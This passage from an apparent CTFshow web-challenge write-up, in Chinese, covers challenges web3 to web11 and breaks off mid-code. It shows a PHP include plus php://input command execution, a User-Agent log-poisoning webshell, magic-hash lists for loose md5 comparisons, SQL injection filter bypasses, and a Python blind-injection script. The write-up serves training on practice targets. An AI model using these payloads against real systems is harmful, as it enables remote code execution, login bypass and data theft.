href="https://blog.csdn.net/cosmoslin/article/details/120695429">PHP伪协议</a></p><p>关键源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt; </span><br></pre></td></tr></table></figure><p>这是一个文件包含的操作，通过参数url可以进行操作，首先利用php:&#x2F;&#x2F;filter读去文件源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>将得到的base64拿去解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$url=$_GET[&#x27;url&#x27;];</span><br><span class="line">if(isset($url))&#123;</span><br><span class="line">    include($url);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web3&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">            </span><br><span class="line">            $code=&quot;&lt;?php include($&quot;.&quot;_GET[&#x27;url&#x27;]);?&gt;&quot;;</span><br><span class="line">            highlight_string($code);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没什么用的代码，直接进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;  #post方式传递</span><br></pre></td></tr></table></figure><p>此时会提示一个ctf_go_go_go的文件，访问这个文件，得到flag</p><h2 id="web4（日志UA注入）"><a href="#web4（日志UA注入）" class="headerlink" title="web4（日志UA注入）"></a>web4（日志UA注入）</h2><p>看到get方式的url参数，像web3一样直接用php伪协议发现报错，学习了别人的博客，说是日志注入，F12发现是nginx服务器，查看了nginx服务器的日志存放，发现是在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，然后访问这个文件，看到了日志：</p><p><img src="/2023/06/04/CTFshow/web4_1.png"></p><p>然后这里发现爆出的是UA，那么猜测是UA注入，用burp抓包，在抓的包UA后面添上一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>重发包得到flag。</p><h2 id="web5（md5弱比较）"><a href="#web5（md5弱比较）" class="headerlink" title="web5（md5弱比较）"></a>web5（md5弱比较）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctype_alpha函数判断参数是否全为字母，is_numeric函数判断参数是否全为数字。</p><p>后面进行md5值的比较，两个md5如果都是以0e加数字组成，那么输入值就为0</p><p>常见的输入值为0的md5:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">纯大写字母：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">QLTHNDT 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO 0e830400451993494058024219903391</span><br><span class="line">EEIZDOI 0e782601363539291779881938479162</span><br><span class="line">TUFEPMC 0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ 0e382098788231234954670291303879</span><br><span class="line">UYXFLOI 0e552539585246568817348686838809</span><br><span class="line">IHKFRNS 0e256160682445802696926137988570</span><br><span class="line">PJNPDWY 0e291529052894702774557631701704</span><br><span class="line">ABJIHVY 0e755264355178451322893275696586</span><br><span class="line">DQWRASX 0e742373665639232907775599582643</span><br><span class="line">DYAXWCA 0e424759758842488633464374063001</span><br><span class="line">GEGHBXL 0e248776895502908863709684713578</span><br><span class="line">GGHMVOE 0e362766013028313274586933780773</span><br><span class="line">GZECLQZ 0e537612333747236407713628225676</span><br><span class="line">NWWKITQ 0e763082070976038347657360817689</span><br><span class="line">NOOPCJF 0e818888003657176127862245791911</span><br><span class="line">MAUXXQC 0e478478466848439040434801845361</span><br><span class="line">MMHUWUV 0e701732711630150438129209816536</span><br><span class="line">纯数字：</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">240610708 0e462097431906509019562988736854</span><br><span class="line">314282422 0e990995504821699494520356953734</span><br><span class="line">571579406 0e972379832854295224118025748221</span><br><span class="line">903251147 0e174510503823932942361353209384</span><br><span class="line">1110242161 0e435874558488625891324861198103</span><br><span class="line">1320830526 0e912095958985483346995414060832</span><br><span class="line">1586264293 0e622743671155995737639662718498</span><br><span class="line">2302756269 0e250566888497473798724426794462</span><br><span class="line">2427435592 0e067696952328669732475498472343</span><br><span class="line">2653531602 0e877487522341544758028810610885</span><br><span class="line">3293867441 0e471001201303602543921144570260</span><br><span class="line">3295421201 0e703870333002232681239618856220</span><br><span class="line">3465814713 0e258631645650999664521705537122</span><br><span class="line">3524854780 0e507419062489887827087815735195</span><br><span class="line">3908336290 0e807624498959190415881248245271</span><br><span class="line">4011627063 0e485805687034439905938362701775</span><br><span class="line">4775635065 0e998212089946640967599450361168</span><br><span class="line">4790555361 0e643442214660994430134492464512</span><br><span class="line">5432453531 0e512318699085881630861890526097</span><br><span class="line">5579679820 0e877622011730221803461740184915</span><br><span class="line">5585393579 0e664357355382305805992765337023</span><br><span class="line">6376552501 0e165886706997482187870215578015</span><br><span class="line">7124129977 0e500007361044747804682122060876</span><br><span class="line">7197546197 0e915188576072469101457315675502</span><br><span class="line">7656486157 0e451569119711843337267091732412</span><br><span class="line">其他：</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>常见的输入值为0的sha1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">10932435112</span><br><span class="line">0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk</span><br><span class="line">0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY</span><br><span class="line">0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF</span><br><span class="line">0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704</span><br><span class="line">0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure><p>按要求将v1和v2传入即可。</p><h2 id="web6（sql注入空格绕过post）"><a href="#web6（sql注入空格绕过post）" class="headerlink" title="web6（sql注入空格绕过post）"></a>web6（sql注入空格绕过post）</h2><p>进入页面，发现是用户登录页面，先尝试SQL注入，在输入万能的SQL语句1’ or1&#x3D;1#后发现报错，burp抓包发现空格被过滤了，直接用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/</span><br></pre></td></tr></table></figure><p>代替空格就行，当然还有另外常见的绕过空格的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">()</span><br><span class="line">回车   //url编码中的%0a</span><br><span class="line">`     //tab键上面的那个键</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><p>绕过了空格之后就是常规的操作了，查显示位，查数据库，查表，查字段。</p><h2 id="web7（sql注入空格绕过get）"><a href="#web7（sql注入空格绕过get）" class="headerlink" title="web7（sql注入空格绕过get）"></a>web7（sql注入空格绕过get）</h2><p>进入页面看见了几个目录，发现是文章，先用目录扫描工具扫了一下，发现的目录访问后没啥用，点击文章后发现有?id&#x3D;1，这里大胆猜测时SQL注入，写一个万能SQL语句，发现报错，抓包后没发现什么问题，慢慢试，发现依然是一个空格绕过，老套路操作就行。</p><h2 id="web8（sql注入过滤了空格、union、and、逗号，报错注入）"><a href="#web8（sql注入过滤了空格、union、and、逗号，报错注入）" class="headerlink" title="web8（sql注入过滤了空格、union、and、逗号，报错注入）"></a>web8（sql注入过滤了空格、union、and、逗号，报错注入）</h2><p>试了很久，我只发现了这道题过滤了空格，然后and也过滤了，但是union、逗号、和select我不知道怎么确定，看了大佬的wp通过报错注入一点一点试，就可以发现逗号被过滤了，select没有被过滤，再进行联合注入，就可以发现union也被过滤了。注入正确返回页面，错误就没啥反应，这里就直接用大佬的脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://6a8bc7d0-0e78-4a6f-814a-2fd51d247a9e.challenge.ctf.show/index.php?id=0/**/or/**/&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># 获取当前使用的数据库</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取当前数据库的所有表</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的字段</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的数据</span></span><br><span class="line">    payload = <span class="string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)</span><br><span class="line">    <span class="comment"># 截取SQL查询结果的每个字符, 并判断字符内容，截取31到128以保证每个可能的flag字符都包含</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        result = requests.get(url + payload % (i, j))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;If&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 如果某个字符不存在,则停止程序,防止继续运行浪费时间</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &gt;= (<span class="number">128</span> - <span class="number">31</span>):</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>知道了报错注入中substr函数中逗号以及如果要限制显示行数的逗号绕过方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(&#x27;str&#x27;,1,1)--&gt;substr(&#x27;str&#x27; from 1 for 1)</span><br><span class="line">limit 0,1--&gt;limit 1 offset 0</span><br></pre></td></tr></table></figure><p><a href="http://t.csdn.cn/qeQlL">大佬博客</a></p><h2 id="web9（sql注入md5-str-true-类型绕过）"><a href="#web9（sql注入md5-str-true-类型绕过）" class="headerlink" title="web9（sql注入md5($str,true)类型绕过）"></a>web9（sql注入md5($str,true)类型绕过）</h2><p>看到登陆页面，一眼SQL注入，但诸如半天没用，扫目录发现可疑的robots.txt，访问后下载文件拿到一段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">if(strlen($password)&gt;10)&#123;</span><br><span class="line">die(&quot;password error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line"> echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line"> echo $flag;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>这段代码意思就是password长度必须小于10，并且写入的password会经过md516字符二进制加密，所以必须找一个字符串经过md516字符二进制加密后，再转化为字符串为一句SQL注入的话语，找不到，看大佬，得到一个字符串:ffifdyop，加密后转化为字符串为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &#x27; &#x27;or&#x27; 6&lt;trach&gt;</span><br></pre></td></tr></table></figure><p>这相当于一个万能密码，由于6为真，那么结果一定为真，也就绕过了。</p><p><a href="https://www.jianshu.com/p/e37e26d2ba7f">大佬博客</a></p><h2 id="web10（sql注入通过group-by-…-with-rollup绕过）"><a href="#web10（sql注入通过group-by-…-with-rollup绕过）" class="headerlink" title="web10（sql注入通过group by … with rollup绕过）"></a>web10（sql注入通过group by … with rollup绕过）</h2><p>进入页面，发现诸如很久都没有用，点击取消后拿到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先知道这道题将几乎所有SQL语句都过滤了，并且是直接删除，当然这里可以双写绕过，但是后面语句会对输入语句和过滤后的语句进行对比，长度不相等就报错，所以双写绕过被防御了，继续看代码后面知道最后还要验证password，只有当username和password都正确时才能登入，这时可以用到group by … with rollup。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group by ...  //将...中的值进行排列</span><br><span class="line">在后面加上with rollup     //将刚刚排列的值进行汇总，由于password并不是数字类型而是字符串类型，所以并不能汇总，会在末尾添加一个NULL，当然如果是数字类型那么就会添加一行汇总。</span><br></pre></td></tr></table></figure><p>这时我们就相当于注入了一个密码空，由于数据库只验证密码，所以用户可以随便，但注入语句须在用户中，因为要保证密码为空。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/104351624">大佬博客</a></p><h2 id="web11（session绕过）"><a href="#web11（session绕过）" class="headerlink" title="web11（session绕过）"></a>web11（session绕过）</h2><p>打开页面看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span 